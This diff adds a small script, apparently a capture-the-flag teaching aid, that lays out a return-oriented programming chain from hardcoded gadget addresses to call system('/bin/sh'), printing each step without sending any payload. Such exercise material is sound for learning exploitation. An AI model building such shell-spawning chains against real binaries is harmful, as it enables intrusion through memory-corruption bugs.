@@ -1,0 +1,42 @@
+# ========================================
+# ROP Chain Builder - CTF PWN Tool
+# ========================================
+
+print("=== ROP Chain Builder ===")
+
+# 常用 Gadget 地址
+pop_rdi = 0x401234
+pop_rsi_r15 = 0x401236
+pop_rdx = 0x401238
+ret_gadget = 0x40123a
+system_addr = 0x7ffff7a52390
+bin_sh = 0x7ffff7b99d88
+
+print("Loaded Gadgets:")
+print(hex(pop_rdi))
+print(hex(pop_rsi_r15))
+print(hex(pop_rdx))
+print(hex(system_addr))
+print(hex(bin_sh))
+
+# 構建 ROP Chain
+print("Building ROP chain...")
+
+# Chain: 對齊棧 + 設置參數 + 調用 system
+chain = []
+chain = append(chain, ret_gadget)
+chain = append(chain, pop_rdi)
+chain = append(chain, bin_sh)
+chain = append(chain, system_addr)
+
+print("=== Final ROP Chain ===")
+print(len(chain))
+
+# 生成 payload
+print("Generating payload...")
+print(hex(chain[0]))
+print(hex(chain[1]))
+print(hex(chain[2]))
+print(hex(chain[3]))
+
+print("[SUCCESS] ROP chain generated!")
